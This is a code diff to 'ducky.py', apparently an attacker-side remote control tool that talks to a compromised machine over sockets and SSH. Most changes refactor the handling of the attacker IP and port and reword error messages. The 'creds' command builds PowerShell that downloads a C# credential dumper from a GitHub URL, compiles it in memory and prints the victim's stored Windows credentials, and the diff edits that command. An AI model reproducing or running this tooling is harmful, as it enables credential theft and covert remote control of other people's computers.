@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # ducky.py
 # Ashish D'Souza
-# January 8th, 2019
+# January 16th, 2019
 
 import socket
 import threading
@@ -38,35 +38,26 @@ def recv(conn):
     print()
 
 
-if "-i" in sys.argv:
-    attacker_ip = sys.argv[sys.argv.index("-i") + 1].split(":")[0]
-    attacker_port = sys.argv[sys.argv.index("-i") + 1].split(":")[1]
-    if "-s" in sys.argv:
-        ssh_address = sys.argv[sys.argv.index("-s") + 1]
-    elif "--ssh" in sys.argv:
-        ssh_address = sys.argv[sys.argv.index("--ssh") + 1]
-    else:
-        ssh_address = input("SSH Server Address >> ")
-elif "--ip" in sys.argv:
-    attacker_ip = sys.argv[sys.argv.index("--ip") + 1].split(":")[0]
-    attacker_port = sys.argv[sys.argv.index("--ip") + 1].split(":")[1]
-    if "-s" in sys.argv:
-        ssh_address = sys.argv[sys.argv.index("-s") + 1]
-    elif "--ssh" in sys.argv:
-        ssh_address = sys.argv[sys.argv.index("--ssh") + 1]
+if "-i" in sys.argv or "--ip" in sys.argv:
+    attacker_address = sys.argv[(sys.argv.index("-i") if "-i" in sys.argv else sys.argv.index("--ip")) + 1]
+    if "-s" in sys.argv or "--ssh" in sys.argv:
+        ssh_address = sys.argv[(sys.argv.index("-s") if "-s" in sys.argv else sys.argv.index("--ssh")) + 1]
     else:
         ssh_address = input("SSH Server Address >> ")
 else:
     if sys.platform[:5] == "linux" or sys.platform == "darwin":
-        attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
+        attacker_address = os.popen("ip route").read().split("src ")[1].split(" ")[0]
     elif sys.platform == "win32":
         ipconfig = os.popen("ipconfig").readlines()
-        attacker_ip = [x.split(": ")[1].strip() for x in ipconfig if "IPv4" in x][0]
+        attacker_address = [x.split(": ")[1].strip() for x in ipconfig if "IPv4" in x][0] + ":" + str(port)
+        del ipconfig
     else:
-        print("ERROR: Operating system not compatible, unable to fetch attacker IP Address.")
-        attacker_ip = input("Manual entry is required >> ")
-    attacker_port = port
+        print("Incompatible operating system, unable to fetch attacker IP Address. Manual entry is required:")
+        attacker_address = input("IP Address >> ") + ":" + str(port)
     ssh_address = "localhost:22"
+
+attacker_ip = attacker_address.split(":")[0]
+attacker_port = attacker_address.split(":")[1]
 ssh_ip = ssh_address.split(":")[0]
 ssh_port = ssh_address.split(":")[1]
 if ssh_ip.lower() == "localhost" or ssh_ip == "127.0.0.1":
@@ -197,7 +188,7 @@ while not stop:
             elif sys.platform == "win32":
                 os.system("cls")
             else:
-                print("ERROR: Operating system not compatible, unable to clear screen.")
+                print("Incompatible operating system, unable to clear screen.")
             stdin = ""
         elif ducky_command[:4] == "info":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -347,7 +338,7 @@ while not stop:
         elif ducky_command[:5] == "creds":
             commands = []
             commands.append("(add-type -typedefinition (new-object net.webclient).downloadstring(\"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/dump-creds.cs\") -language csharp -passthru)>$null")
-            commands.append("([credential]::loadall()|out-string).trim()")
+            commands.append("try{([credential]::loadall()|out-string).trim()}catch{echo \"No credentials found.\"}")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
@@ -360,7 +351,7 @@ while not stop:
         elif sys.platform == "win32":
             os.system("cls")
         else:
-            print("ERROR: Operating system not compatible, unable to clear screen.")
+            print("Incompatible operating system, unable to clear screen.")
     elif stdin == "ls" or stdin.startswith("ls "):
         stdin = "(" + stdin + " | out-string).trim()"
     elif "tasklist" in stdin:
